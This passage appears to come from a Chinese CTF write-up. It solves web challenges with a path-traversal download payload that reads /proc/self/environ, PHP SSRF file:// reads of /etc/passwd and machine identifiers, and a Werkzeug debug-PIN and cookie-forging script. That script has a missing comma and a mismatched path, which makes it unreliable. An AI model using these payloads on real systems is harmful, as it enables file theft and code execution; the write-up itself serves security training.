</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=p>{</span> <span class=nx>verifySession</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;../../components/utils/session&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>logger</span> <span class=o>=</span> <span class=nx>global</span><span class=p>.</span><span class=nx>logger</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * @deprecated
</span></span></span><span class=line><span class=cl><span class=cm> * ! FIXME: 发现漏洞，请进行修改
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/s/:hashfn&#34;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>ctx</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>hash_fn</span> <span class=o>=</span> <span class=nb>String</span><span class=p>(</span><span class=nx>ctx</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>hashfn</span> <span class=o>||</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>hash</span> <span class=o>=</span> <span class=nx>hash_fn</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>from_uid</span> <span class=o>=</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>from_uid</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>custom_fn</span> <span class=o>=</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>fn</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 参数校验
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>hash_fn</span> <span class=o>!==</span> <span class=s2>&#34;string&#34;</span> <span class=o>||</span> <span class=k>typeof</span> <span class=nx>from_uid</span> <span class=o>!==</span> <span class=s2>&#34;string&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// invalid params or query
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nx>ctx</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s2>&#34;X-Error-Reason&#34;</span><span class=p>,</span> <span class=s2>&#34;Invalid Params&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>ctx</span><span class=p>.</span><span class=nx>status</span> <span class=o>=</span> <span class=mi>400</span><span class=p>;</span> <span class=c1>// Bad Request
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 是否为共享的文件
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>let</span> <span class=nx>IS_FILE_EXIST</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>DriveUtil</span><span class=p>.</span><span class=nx>isShareFileExist</span><span class=p>(</span><span class=nx>hash</span><span class=p>,</span> <span class=nx>from_uid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>IS_FILE_EXIST</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>ctx</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s2>&#34;X-Error-Reason&#34;</span><span class=p>,</span> <span class=s2>&#34;File Not Found&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>ctx</span><span class=p>.</span><span class=nx>status</span> <span class=o>=</span> <span class=mi>404</span><span class=p>;</span> <span class=c1>// Not Found
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 系统中是否存储有该文件
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>let</span> <span class=nx>IS_FILE_EXIST_IN_STORAGE</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>IS_FILE_EXIST_IN_STORAGE</span> <span class=o>=</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>existsSync</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>resolve</span><span class=p>(</span><span class=nx>CONFIG</span><span class=p>.</span><span class=nx>storage_path</span><span class=p>,</span> <span class=nx>hash_fn</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>ctx</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s2>&#34;X-Error-Reason&#34;</span><span class=p>,</span> <span class=s2>&#34;Internal Server Error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>ctx</span><span class=p>.</span><span class=nx>status</span> <span class=o>=</span> <span class=mi>500</span><span class=p>;</span> <span class=c1>// Internal Server Error
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>IS_FILE_EXIST_IN_STORAGE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>logger</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=sb>`File </span><span class=si>${</span><span class=nx>hash_fn</span><span class=p>.</span><span class=nx>yellow</span><span class=si>}</span><span class=sb> not found in storage, but exist in database!`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>ctx</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s2>&#34;X-Error-Reason&#34;</span><span class=p>,</span> <span class=s2>&#34;Internal Server Error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>ctx</span><span class=p>.</span><span class=nx>status</span> <span class=o>=</span> <span class=mi>500</span><span class=p>;</span> <span class=c1>// Internal Server Error
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 文件名处理
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>let</span> <span class=nx>filename</span> <span class=o>=</span> <span class=k>typeof</span> <span class=nx>custom_fn</span> <span class=o>===</span> <span class=s2>&#34;string&#34;</span> <span class=o>?</span> <span class=nx>custom_fn</span> <span class=o>:</span> <span class=p>(</span><span class=kr>await</span> <span class=nx>DriveUtil</span><span class=p>.</span><span class=nx>getFilename</span><span class=p>(</span><span class=nx>from_uid</span><span class=p>,</span> <span class=nx>hash</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nx>filename</span> <span class=o>=</span> <span class=nx>filename</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/[\\\/\:\*\&#34;\&#39;\&lt;\&gt;\|\?\x00-\x1F\x7F]/gi</span><span class=p>,</span> <span class=s2>&#34;_&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 发送
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>ctx</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s2>&#34;Content-Disposition&#34;</span><span class=p>,</span> <span class=sb>`attachment; filename*=UTF-8&#39;&#39;</span><span class=si>${</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>filename</span><span class=p>)</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kr>await</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>sendFile</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>resolve</span><span class=p>(</span><span class=nx>CONFIG</span><span class=p>.</span><span class=nx>storage_path</span><span class=p>,</span> <span class=nx>hash_fn</span><span class=p>)).</span><span class=k>catch</span><span class=p>(</span><span class=nx>e</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>logger</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=sb>`Error while sending file </span><span class=si>${</span><span class=nx>hash_fn</span><span class=p>.</span><span class=nx>yellow</span><span class=si>}</span><span class=sb>`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>logger</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=nx>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>ctx</span><span class=p>.</span><span class=nx>status</span> <span class=o>=</span> <span class=mi>500</span><span class=p>;</span> <span class=c1>// Internal Server Error
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>module</span><span class=p>.</span><span class=nx>exports</span> <span class=o>=</span> <span class=nx>router</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>进行目录穿越即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron?from_uid=100000
</span></span></code></pre></td></tr></table></div></div><h2 id=pppython>pppython?</h2><p><a class=link href=https://www.cnblogs.com/m1xian/p/18528813 target=_blank rel=noopener>https://www.cnblogs.com/m1xian/p/18528813</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;hint&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=p>[</span><span class=s2>&#34;your?&#34;</span><span class=p>,</span> <span class=s2>&#34;mine!&#34;</span><span class=p>,</span> <span class=s2>&#34;hint!!&#34;</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>        <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Content-type: text/plain&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;ls / -la&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ch</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_CONNECTTIMEOUT</span><span class=p>,</span> <span class=mi>60</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HTTPHEADER</span><span class=p>,</span> <span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;lolita&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$output</span> <span class=o>=</span> <span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$output</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>curl_close</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>   
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>catch</span> <span class=p>(</span><span class=nx>Error</span> <span class=nv>$x</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>highlight_string</span><span class=p>(</span><span class=nv>$x</span><span class=o>-&gt;</span><span class=na>getMessage</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> curl_setopt(): The CURLOPT_HTTPHEADER option must have an array value
</span></span></span></code></pre></td></tr></table></div></div><p>直接数组过，然后文件读取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?hint[0]=your?&amp;hint[1]=mine!&amp;hint[2]=hint!!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?url=file:///app.py&amp;lolita[]=
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>render_template_string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=c1># from NeepuF1Le import neepu_files</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SECRET_KEY&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;******&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>welcome</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;islogin&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;flag{***********************}&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=mi>1314</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>开启 debug模式，并且可以读取文件，打pin值</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?url=file:///etc/passwd&amp;lolita[]=
</span></span><span class=line><span class=cl>得到root
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flask.app
</span></span><span class=line><span class=cl>Flask
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?url=file:///sys/class/net/eth0/address&amp;lolita[]=
</span></span><span class=line><span class=cl>f6:f5:77:8b:67:8d 1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?url=file:///etc/machine-id&amp;lolita[]=
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?url=file:///proc/sys/kernel/random/boot_id&amp;lolita[]=
</span></span><span class=line><span class=cl>a7cf87a4-f7b3-4edd-93e3-854e78d97842 1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?url=file:///proc/self/cgroup&amp;lolita[]=
</span></span><span class=line><span class=cl>-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># NeepuF1Le 是什么python版本才出现的 -&gt; neupy python 3.10
</span></span><span class=line><span class=cl>/usr/local/lib/python3.10/dist-packages/flask/app.py
</span></span></code></pre></td></tr></table></div></div><p>最后整理一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>flask.app
</span></span><span class=line><span class=cl>Flask
</span></span><span class=line><span class=cl>/usr/local/lib/python3.10/dist-packages/flask/app.py
</span></span><span class=line><span class=cl>271534133045133
</span></span><span class=line><span class=cl>a7cf87a4-f7b3-4edd-93e3-854e78d97842-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope
</span></span></code></pre></td></tr></table></div></div><p>但是这是<code>python3.10</code>好像不能用于之前的脚本，之前都是3.8最高</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>chain</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=n>probably_public_bits</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;root&#39;</span>  
</span></span><span class=line><span class=cl>    <span class=s1>&#39;flask.app&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Flask&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;/usr/local/lib/python3.10/site-packages/flask/app.py&#39;</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>private_bits</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;271534133045133&#39;</span><span class=p>,</span>  
</span></span><span class=line><span class=cl>    <span class=s1>&#39;a7cf87a4-f7b3-4edd-93e3-854e78d97842-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope&#39;</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha1</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>bit</span> <span class=ow>in</span> <span class=n>chain</span><span class=p>(</span><span class=n>probably_public_bits</span><span class=p>,</span> <span class=n>private_bits</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>bit</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>bit</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>bit</span> <span class=o>=</span> <span class=n>bit</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>bit</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;cookiesalt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cookie_name</span> <span class=o>=</span> <span class=s1>&#39;__wzd&#39;</span> <span class=o>+</span> <span class=n>h</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()[:</span><span class=mi>20</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>num</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;pinsalt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>num</span> <span class=o>=</span> <span class=p>(</span><span class=s1>&#39;</span><span class=si>%09d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>(),</span> <span class=mi>16</span><span class=p>))[:</span><span class=mi>9</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rv</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>rv</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>group_size</span> <span class=ow>in</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>%</span> <span class=n>group_size</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>rv</span> <span class=o>=</span> <span class=s1>&#39;-&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>num</span><span class=p>[</span><span class=n>x</span><span class=p>:</span><span class=n>x</span> <span class=o>+</span> <span class=n>group_size</span><span class=p>]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=n>group_size</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                          <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>),</span> <span class=n>group_size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>rv</span> <span class=o>=</span> <span class=n>num</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>rv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hash_pin</span><span class=p>(</span><span class=n>pin</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha1</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>pin</span><span class=si>}</span><span class=s2> added salt&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=s2>&#34;replace&#34;</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()[:</span><span class=mi>12</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>cookie_name</span> <span class=o>+</span> <span class=s2>&#34;=&#34;</span> <span class=o>+</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span><span class=si>}</span><span class=s2>|</span><span class=si>{</span><span class=n>hash_pin</span><span class=p>(</span><span class=n>rv</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
